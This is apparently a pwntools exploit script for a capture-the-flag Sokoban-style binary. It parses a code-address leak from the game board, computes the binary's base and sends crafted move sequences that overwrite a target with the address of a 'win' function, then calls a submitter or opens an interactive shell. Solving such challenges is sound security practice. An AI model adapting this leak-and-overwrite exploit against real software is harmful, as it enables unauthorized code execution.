from pwn import *

var = os.getenv("DEBUGINFOD_URLS")

binary_name = "challenge"
exe  = ELF(binary_name, checksec=True)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6" if var is None else "libc.so.6", checksec=False)
context.binary = exe

ru	= lambda *x: r.recvuntil(*x)
rl	= lambda *x: r.recvline(*x)
rc	= lambda *x: r.recv(*x)
sla = lambda *x: r.sendlineafter(*x)
sa	= lambda *x: r.sendafter(*x)
sl	= lambda *x: r.sendline(*x)
sn	= lambda *x: r.send(*x)

if var is None:
	HOST = os.environ.get("HOST", "localhost")
	PORT = 31337
	r = connect(HOST, int(PORT))
elif args.GDB:
	r = process(f"debug_dir/{binary_name}.bak")
	gdb.attach(r, """
		brva 0x1A87
		c
	""")
else:
	r = process(f"debug_dir/{binary_name}.bak")

for i in range(13):
	rl()

leak = rl().strip()[::-1] + rl().strip()[::-1]
leak = leak.replace(b"o", b"1").replace(b".", b"0")
leak = int(leak, 2)
info("leak    ---> %#18x", leak)
exe.address = leak - 0x1274
info("code    ---> %#18x", exe.address)

sl(b"w")

ru(b"Sokobin!\n")
sl(b"s" * 15 + b"r" + b"s" * 8 + b"ws" + b"w" * 4 + b"s" * 30)

target = exe.sym.win
low = target & 0xFFFFFFFF
high = target >> 32

sl(b"wwwrrra" * 32)
sl(b"www" + b"s" * 32)


sl((b"w" + b"a" * 30 + b"s" * 30) * 2)
sl(b"rr" + b"awr" * 15 + b"s" * 16 + b"ww" + b"a" * 16)
sl(b"www" + b"a" * 32 + b"rr" + b"s" * 32 + b"a" * 32 + b"w" + b"s" * 32 + b"a" * 32)
sl(b"w" + b"s" * 32 + b"r" * 5 + b"a" * 32)
sl(b"wrs" * 16)
sl(b"s" * 16 + b"w" * 5 + b"a" * 32 + b"r")

thl = high & 0xffff
tll = low & 0xffff
board = f"{thl:016b}"[::-1], f"{tll:016b}"[::-1]
r.clean()
print(board[0])
print(board[1])

p = b""
for ab in zip(*board):
	ab = "".join(ab)
	if ab == "00":
		pass
	if ab == "10":
		p += b"rw"
	if ab == "11":
		p += b"rrww"
	if ab == "01":
		p += b"rrrwww"
	p += b"s"
sl(p)

sl(b"a" * 32 + b"ww" + b"s" * 32 + b"a" * 32)
sl(b"www" + b"srrww" * 20)
sl(b"a" * 20 + b"rrr" + b"s" * 20)
sl(b"w" + b"s" * 32)

tlr = (low >> 16)
board = f"{tlr:016b}"

p = b""
for i in board:
	if i == "1":
		p += b"r" * 6 + b"w" * 6
	p += b"a"
sl(p)
sl(b"q")
r.clean()


if var is None:
	r.sendline(b'./submitter')
	print(r.recvall(timeout=1))
else:
	r.interactive()
